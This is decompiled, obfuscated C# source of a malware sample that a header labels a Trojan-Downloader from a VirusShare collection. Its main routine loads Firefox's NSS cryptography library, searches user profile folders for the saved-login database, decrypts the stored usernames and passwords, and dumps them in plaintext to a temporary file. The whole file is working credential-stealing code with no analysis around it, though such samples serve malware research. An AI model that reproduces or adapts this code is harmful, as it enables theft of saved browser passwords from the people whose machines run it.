// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7761CAE9-D290-48D9-A44C-5C95C5289DD6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Downloader.MSIL.VKont.a-1d4cb0f0a33db378f9e4ae1b0f91ee4baabf5f1a669646e1278e016241a1452a.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace \u0003
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private static IntPtr \u0001;
    public static string \u0001;

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
    private static extern IntPtr \u0002([In] string obj0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr \u0002([In] IntPtr obj0, [In] string obj1);

    public static long \u0002([In] string obj0)
    {
      string str = Environment.GetEnvironmentVariable(\u0003.\u0002.\u0001(419)) + \u0003.\u0002.\u0001(436);
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(461));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(478));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(491));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(504));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(517));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(534));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(551));
      \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(568));
      \u0003.\u0002.\u0001 = \u0003.\u0002.\u0002(str + \u0003.\u0002.\u0001(585));
      return ((\u0003.\u0002.\u0002) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(598)), typeof (\u0003.\u0002.\u0002)))(obj0);
    }

    public static long \u0002() => ((\u0003.\u0002.\u0003) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(611)), typeof (\u0003.\u0002.\u0003)))();

    public static long \u0002([In] long obj0, [In] bool obj1, [In] long obj2) => ((\u0003.\u0002.\u0004) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(644)), typeof (\u0003.\u0002.\u0004)))(obj0, obj1, obj2);

    public static int \u0002([In] IntPtr obj0, [In] IntPtr obj1, [In] StringBuilder obj2, [In] int obj3) => ((\u0003.\u0002.\u0005) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(669)), typeof (\u0003.\u0002.\u0005)))(obj0, obj1, obj2, obj3);

    public static int \u0002([In] ref \u0003.\u0002.\u0001 obj0, [In] ref \u0003.\u0002.\u0001 obj1, [In] int obj2) => ((\u0003.\u0002.\u0006) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(702)), typeof (\u0003.\u0002.\u0006)))(ref obj0, ref obj1, obj2);

    public static void \u0002()
    {
      string tempPath = Path.GetTempPath();
      if (!\u0002.\u0002.\u0002().Network.IsAvailable)
        return;
      TextWriter newOut1 = Console.Out;
      FileStream fileStream;
      StreamWriter newOut2;
      try
      {
        fileStream = new FileStream(tempPath + \u0003.\u0002.\u0001(723), FileMode.OpenOrCreate, FileAccess.Write);
        newOut2 = new StreamWriter((Stream) fileStream);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        return;
      }
      try
      {
        Console.SetOut((TextWriter) newOut2);
        Console.WriteLine();
        bool flag = false;
        string str1 = Environment.GetEnvironmentVariable(\u0003.\u0002.\u0001(419)) + \u0003.\u0002.\u0001(436);
        string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(\u0003.\u0002.\u0001(736)) + \u0003.\u0002.\u0001(749));
        int index1 = 0;
        while (index1 < directories.Length)
        {
          string path = directories[index1];
          if (!flag)
          {
            string[] files = Directory.GetFiles(path);
            int index2 = 0;
            while (index2 < files.Length)
            {
              string input = files[index2];
              if (!flag)
              {
                if (Regex.IsMatch(input, \u0003.\u0002.\u0001(786)))
                {
                  \u0003.\u0002.\u0002(path);
                  \u0003.\u0002.\u0001 = input;
                }
                checked { ++index2; }
              }
              else
                break;
            }
            checked { ++index1; }
          }
          else
            break;
        }
        string str2 = \u0003.\u0002.\u0001;
        \u0003.\u0002.\u0001 obj1 = new \u0003.\u0002.\u0001();
        \u0003.\u0002.\u0001 obj2 = new \u0003.\u0002.\u0001();
        \u0003.\u0002.\u0001 obj3 = new \u0003.\u0002.\u0001();
        \u0004.\u0001 obj4 = new \u0004.\u0001(str2);
        DataTable dataTable1 = obj4.\u0002(\u0003.\u0002.\u0001(807));
        DataTable dataTable2 = obj4.\u0002(\u0003.\u0002.\u0001(844));
        Console.WriteLine(\u0003.\u0002.\u0001(889));
        try
        {
          foreach (DataRow row in dataTable2.Rows)
            Console.WriteLine(row[\u0003.\u0002.\u0001(926)].ToString());
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        Console.WriteLine();
        Console.WriteLine();
        \u0003.\u0002.\u0002(\u0003.\u0002.\u0002(), true, 0L);
        Console.WriteLine();
        try
        {
          foreach (DataRow row in dataTable1.Rows)
          {
            string str3 = Convert.ToString(row[\u0003.\u0002.\u0001(939)].ToString());
            Console.WriteLine(\u0003.\u0002.\u0001(960) + str3 + \u0003.\u0002.\u0001(969));
            StringBuilder stringBuilder1 = new StringBuilder(row[\u0003.\u0002.\u0001(978)].ToString());
            IntPtr num = new IntPtr(\u0003.\u0002.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder1, stringBuilder1.Length));
            \u0003.\u0002.\u0001 structure1 = (\u0003.\u0002.\u0001) Marshal.PtrToStructure(num, typeof (\u0003.\u0002.\u0001));
            if (\u0003.\u0002.\u0002(ref structure1, ref obj2, 0) == 0 && obj2.\u0003 != 0)
            {
              byte[] numArray = new byte[checked (obj2.\u0003 - 1 + 1)];
              num = new IntPtr(obj2.\u0002);
              Marshal.Copy(num, numArray, 0, obj2.\u0003);
              Console.WriteLine(\u0003.\u0002.\u0001(1003) + Encoding.ASCII.GetString(numArray) + \u0003.\u0002.\u0001(969));
            }
            StringBuilder stringBuilder2 = new StringBuilder(row[\u0003.\u0002.\u0001(1020)].ToString());
            num = new IntPtr(\u0003.\u0002.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length));
            \u0003.\u0002.\u0001 structure2 = (\u0003.\u0002.\u0001) Marshal.PtrToStructure(num, typeof (\u0003.\u0002.\u0001));
            if (\u0003.\u0002.\u0002(ref structure2, ref obj3, 0) == 0 && obj3.\u0003 != 0)
            {
              byte[] numArray = new byte[checked (obj3.\u0003 - 1 + 1)];
              num = new IntPtr(obj3.\u0002);
              Marshal.Copy(num, numArray, 0, obj3.\u0003);
              Console.WriteLine(\u0003.\u0002.\u0001(1045) + Encoding.ASCII.GetString(numArray) + \u0003.\u0002.\u0001(969));
            }
            Console.WriteLine();
            Console.WriteLine();
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        Console.WriteLine();
        Console.WriteLine(\u0003.\u0002.\u0001(1062));
        Console.SetOut(newOut1);
        newOut2.Close();
        fileStream.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    static \u0002() => \u0001.\u0002.\u0002();

    public struct \u0001
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
    }

    public delegate long \u0002(string configdir);

    public delegate long \u0003();

    public delegate long \u0004(long slot, bool loadCerts, long wincx);

    public delegate int \u0005(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

    public delegate int \u0006(ref \u0003.\u0002.\u0001 data, ref \u0003.\u0002.\u0001 result, int cx);
  }
}
